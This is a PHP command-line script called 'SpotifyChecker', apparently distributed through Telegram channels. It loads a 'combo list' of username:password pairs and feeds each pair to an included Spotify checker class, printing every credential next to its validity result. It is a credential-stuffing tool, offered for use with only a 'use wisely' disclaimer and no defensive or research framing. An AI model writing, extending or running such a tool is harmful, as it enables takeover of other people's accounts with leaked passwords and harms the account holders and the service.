
<?php
/*
* Created by @jaynammodi
* Last Update: 21/02/2019
* Time: 14.00
* Telegram @hewhomustnotbenamed
*/

// DO NOT MODIFY!! I WILL NOT BE RESPONSIBLE FOR ANY KIND OF MODIFICATIONS WHICH HINDER THE FUNCTIONABILITY OF THE PROGRAM!!!

/*echo "\033[01;31m
    ### #####  #####  ###### ##  ##### ###  ##    ##### ##  ##  #####  ##### ##  ## ##### ######   ## ##
   ##       ##     ##   ##   ##  ##    ###  ##   ##     ##  ##  ##    ##     ## ##  ##    ##   ##  ## ##
   ##   ##### ##   ##   ##   ##  ##### #######   ##     ######  ##### ##     ####   ##### #####    ## ##
   ##   ##    ##   ##   ##   ##  ##        ###   ##     ##  ##  ##    ##     ## ##  ##    ##  ##
 ###    ##     ####     ##   ##  ##        ###    ##### ##  ##  #####  ##### ##  ## ##### ##   ### ## ## v0.2\033[0m";*/
 
echo "\033[01;31m ";
system('figlet SpotifyChecker!!');
echo "v0.22\033[0m";
echo "\n\n
\033[01;31m[•]\033[09;31mv0.1\033[0m\033[01;31mv0.2 Developed by \033[01;32;1m@hewhomustn0tbenamed\033[01;31m (Telegram).\033[0m\n Press Enter to Continue...\n";
fgetc(STDIN);
echo "\033[01;31m\n[•]You're Responsible For your Actions. Use Wisely.
[•]Join \033[01;32;1m@VoldemortCommunity (Telegram)\033[01;31m for More!.
[•]Huge Thanks to @DrWean for His Outdated GitHub Repo.
[•]Thank You to all the Testers!! and StackOverflow.
\033[0m";
include ('class.spotify.php');

echo "\n\033[51;33;1m[i]Are You Sure You Want To Do This?  Type \033[01;32;1m'yes'\033[51;33;1m to Continue :\033[0m ";
$handle3 = fopen("php://stdin", "rb");
$ln = fgets($handle3);

if (trim($ln) == 'yes') {
	echo "\n\033[01;32;1m[i]Enter Combo List Name : \033[0m";
	$handle1 = fopen("php://stdin", "r");
	$inpnam = fgets($handle1);
	$lines = file(trim($inpnam));
	echo "\n \n\033[01;32;1m[i]Enter Combo List Type:\n \n[1] Username:Password\n \n[2] Email:Password\n \nResponse[1/2]:\033[0m ";
	$comtype = fgets(fopen("php://stdin", "r"));
	echo "Press Enter to Continue...";
	fgetc(STDIN);
	system('clear');

	//    echo "n\033[01;32;1m[i]Let's Begin...n";
	//    echo "\033[51;\033;1m[i]Press Ctrl+C or Tap and Hold ~> More ~> Kill Process to Exit before The Execution Completes!\033[0mnnn";

	if (trim($comtype) == '1') {
		echo "\n\033[01;32;1m[i]Let's Begin...\n";
		echo "\033[51;033;1m[i]Press Ctrl+C or Tap and Hold ~> More ~> Kill Process to Exit before The Execution Completes!\033[0m\n\n\n";

		// echo $comtype."1";

		$spotify = new spotify();
		foreach($lines as $line) {
			$var = explode(':', $line);
			$usernn = $var[0];
			$inppass = $var[1];
			$res = $spotify->check($usernn, $inppass);
			echo "[!]Username : " . $usernn . "\n";
			echo "[!]Password : " . $inppass;
			echo "[!]" . $res . "\n\n";
		}
	}
	else
	if (trim($comtype) == '2') {

		// echo $comtype."2";

		echo "\033[05;33;1mCOMING SOON!!!\nThe Program will Now Exit!!\nPress Enter to Continue...\033[0m";
		fgetc(STDIN);
		exit;
	}
}
else {
	echo "\033[05;31mABORTING....\nThe Program will Now Exit!!\\nPress Enter to Continue...\033[0m";
	fgetc(STDIN);
	exit;
}

